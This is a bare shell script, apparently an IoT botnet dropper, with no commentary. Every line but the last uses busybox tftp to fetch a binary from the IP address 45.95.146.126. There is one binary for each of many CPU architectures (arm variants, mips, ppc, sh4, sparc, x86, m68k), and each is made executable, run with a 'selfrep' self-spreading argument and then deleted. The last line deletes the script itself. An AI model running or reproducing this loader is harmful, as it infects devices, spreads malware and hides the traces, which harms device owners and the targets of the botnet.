#!/bin/sh
/bin/busybox tftp -g 45.95.146.126 -r jklarm -l jklarm;/bin/busybox chmod +x jklarm;./jklarm selfrep;/bin/busybox rm -rf jklarm
/bin/busybox tftp -g 45.95.146.126 -r jklarm5 -l jklarm5;/bin/busybox chmod +x jklarm5;./jklarm5 selfrep;/bin/busybox rm -rf jklarm5
/bin/busybox tftp -g 45.95.146.126 -r jklarm6 -l jklarm6;/bin/busybox chmod +x jklarm6;./jklarm6 selfrep;/bin/busybox rm -rf jklarm6
/bin/busybox tftp -g 45.95.146.126 -r jklarm7 -l jklarm7;/bin/busybox chmod +x jklarm7;./jklarm7 selfrep;/bin/busybox rm -rf jklarm7
/bin/busybox tftp -g 45.95.146.126 -r jklm68k -l jklm68k;/bin/busybox chmod +x jklm68k;./jklm68k selfrep;/bin/busybox rm -rf jklm68k
/bin/busybox tftp -g 45.95.146.126 -r jklmips -l jklmips;/bin/busybox chmod +x jklmips;./jklmips selfrep;/bin/busybox rm -rf jklmips
/bin/busybox tftp -g 45.95.146.126 -r jklmpsl -l jklmpsl;/bin/busybox chmod +x jklmpsl;./jklmpsl selfrep;/bin/busybox rm -rf jklmpsl
/bin/busybox tftp -g 45.95.146.126 -r jklppc -l jklppc;/bin/busybox chmod +x jklppc;./jklppc selfrep;/bin/busybox rm -rf jklppc
/bin/busybox tftp -g 45.95.146.126 -r jklsh4 -l jklsh4;/bin/busybox chmod +x jklsh4;./jklsh4 selfrep;/bin/busybox rm -rf jklsh4
/bin/busybox tftp -g 45.95.146.126 -r jklspc -l jklspc;/bin/busybox chmod +x jklspc;./jklspc selfrep;/bin/busybox rm -rf jklspc
/bin/busybox tftp -g 45.95.146.126 -r jklx86 -l jklx86;/bin/busybox chmod +x jklx86;./jklx86 selfrep;/bin/busybox rm -rf jklx86
/bin/busybox rm -rf tftp.sh
